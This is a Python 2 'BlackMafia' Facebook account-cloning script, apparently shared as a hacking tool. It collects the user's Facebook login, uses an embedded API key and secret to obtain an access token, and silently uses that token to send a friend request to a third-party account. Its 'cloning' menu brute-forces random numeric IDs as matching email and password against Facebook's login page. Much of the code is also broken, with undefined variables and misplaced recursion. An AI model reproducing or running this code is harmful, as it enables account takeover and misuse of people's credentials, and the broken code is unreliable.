#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.07)

#Dev:love_hacker
##### LOGO #####
logo = """
\033[1;97m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
\033[1;97m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
\033[1;97m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
\033[1;97m██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░
\033[1;97m██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗
\033[1;97m╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
\033[1;94m███╗░░░███╗░█████╗░███████╗██╗░█████╗░
\033[1;94m████╗░████║██╔══██╗██╔════╝██║██╔══██╗
\033[1;94m██╔████╔██║███████║█████╗░░██║███████║
\033[1;94m██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║
\033[1;94m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
\033[1;97m:•◈•╔╗─────────╔╗───────╔╗
\033[1;97m:•◈•║║─────────║║───────║║
\033[1;97m:•◈•║║╔══╦╗╔╦══╣╚═╦══╦══╣║╔╦══╦═╗
\033[1;97m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   
\033[1;97m:•◈•║╚╣╚╝╠╗╔╣║═╣║║║╔╗║╚═╣╔╗╣║═╣║    
\033[1;97m:•◈•╚═╩══╝╚╝╚══╩╝╚╩╝╚╩══╩╝╚╩══╩╝
\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;94m╔══╗╔╗──────╔╗─╔═╗╔═╗───╔═╗
\033[1;94m║╔╗║║║──────║║─║║╚╝║║───║╔╝
\033[1;94m║╚╝╚╣║╔══╦══╣║╔╣╔╗╔╗╠══╦╝╚╦╦══╗
\033[1;94m║╔═╗║║║╔╗║╔═╣╚╝╣║║║║║╔╗╠╗╔╬╣╔╗║
\033[1;94m║╚═╝║╚╣╔╗║╚═╣╔╗╣║║║║║╔╗║║║║║╔╗║
\033[1;94m╚═══╩═╩╝╚╩══╩╝╚╩╝╚╝╚╩╝╚╝╚╝╚╩╝╚╝
\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
jalan('\033[1;94m=10%')
jalan("\033[1;94m==20%")
jalan('\033[1;94m===30%')
jalan('\033[1;94m====40%')
jalan("\033[1;94m=====50%")
jalan("\033[1;94m======60%")
jalan('\033[1;94m=======70%')
jalan('\033[1;94m========80%')
jalan('\033[1;94m=========90%')
jalan('\033[1;94m==========100%')
print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "Testing"
CorrectPassword = "lovehacker"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;94mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;94mTool Password \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		jalan(' \033[1;94mWarning: \033[1;97mDo Not Use Your Personal Account' )
		jalan(' \033[1;94mWarning: \033[1;97mUse a New Account To Login' )
		jalan(' \033[1;94mWarning: \033[1;97mTermux Old Version install 0.63✅' )                 
		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
		print('	' )
		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;94mLogin Successful.•◈•..'
				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;94mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:love_hacker
	print logo
	print "  \033[1;97m«----•◈••◈•----\033[1;94mLogged in User Info\033[1;97m----•◈••◈•-----»"
	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;94mStart Cloning US..."
	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m2.\x1b[1;94mStart Cloning..."
        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mlogout            "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;94mChoose an Option>>> \033[1;97m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		available_facebook_motah()
	elif unikers =="2":
		black()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def available_facebook_motah():
        global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print ""
        print ""
        print"    options (available_facebook_motah):" 
        print ""
        print"        Name      Current Setting      Required      Description"
        print"        NOMBER    "+nomber[0]+"                   yes           NOMBER "
        print ""
        print ""
	available_facebook_motah()
        print "[*]"+default+"starting cracking"
        print ""
	def menu():
		try:
			email = str(raw_input("email"))
			email = str(random.randint(11111111,99999999))
			go = kk + email
                        password = str(raw_input("bass" ))
                        password = str(random.randint(11111111,99999999))
                        login = 'https://www.facebook.com/login.php?login_attempt=1'
                        useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                        basss = random.randint(1111111,9999999)
                        br = mechanize.Browser()
                        amer = cookielib.LWPCookieJar()
                        br.set_handle_robots(False)
                        br.set_handle_redirect(True)
                        br.set_cookiejar(amer)
                        br.set_handle_equiv(True)
                        br.set_handle_referer(True)
                        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=5) 
                        br.addheaders = [('User-agent', random.choice(useragents))]
                        site = br.open(login)
                        br.select_form(nr = 0)
                        br.form['email'] = go
                        br.form['pass'] = go
                        sub = br.submit()
                        log = sub.geturl()
                        print b,"[*]Check===> ",r,go
                        if "https://www.facebook.com/checkpoint/?next" in log :
				print g,"[*]good ---------> ",c,go
                        elif "https://www.facebook.com/login.php" and "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
                                print ""
                        elif "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100" in log :
                                print ""
			else :
				print y,"--------------------------------"
                                print g,"[*]email ---------> ",g,go
                                print g,"[*]pass ---------> ",g,go
                                print y,"--------------------------------"
                                pilih()
				raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
				menu()
				if __name__ == '__main__':
					login()
